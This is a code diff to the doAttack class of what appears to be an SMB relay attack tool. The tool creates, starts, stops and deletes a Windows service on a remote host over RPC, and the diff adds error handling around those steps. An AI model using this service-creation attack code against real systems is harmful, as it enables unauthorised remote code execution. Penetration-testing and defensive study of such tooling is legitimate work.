@@ -67,8 +67,15 @@ class doAttack(Thread):
 
 
         # First we try to open the service in case it exists. If it does, we remove it.
-        resp = self.rpcsvc.OpenServiceW(handle, self.__service_name.encode('utf-16le'))
-        if resp['ErrorCode'] == 0:
+        try:
+            resp = self.rpcsvc.OpenServiceW(handle, self.__service_name.encode('utf-16le'))
+        except Exception, e:
+            if e.get_error_code() == svcctl.ERROR_SERVICE_DOES_NOT_EXISTS:
+                # We're good, pass the exception
+                pass
+            else:
+                raise
+        else:
             # It exists, remove it
             self.rpcsvc.DeleteService(resp['ContextHandle'])
             self.rpcsvc.CloseServiceHandle(resp['ContextHandle'])
@@ -151,10 +158,16 @@ class doAttack(Thread):
                     # Start service
                     print "[*] Connect now to %s!" % self.client.get_remote_host()
                     print '[*] Starting service %s.....' % self.__service_name,
-                    self.rpcsvc.StartServiceW(service)
+                    try:
+                        self.rpcsvc.StartServiceW(service)
+                    except:
+                        pass
                     print 'OK'
                     print '[*] Stoping service %s.....' % self.__service_name,
-                    self.rpcsvc.StopService(service)
+                    try:
+                        self.rpcsvc.StopService(service)
+                    except:
+                        pass
                     print 'OK'
                     print '[*] Removing service %s.....' % self.__service_name,
                     self.rpcsvc.DeleteService(service)
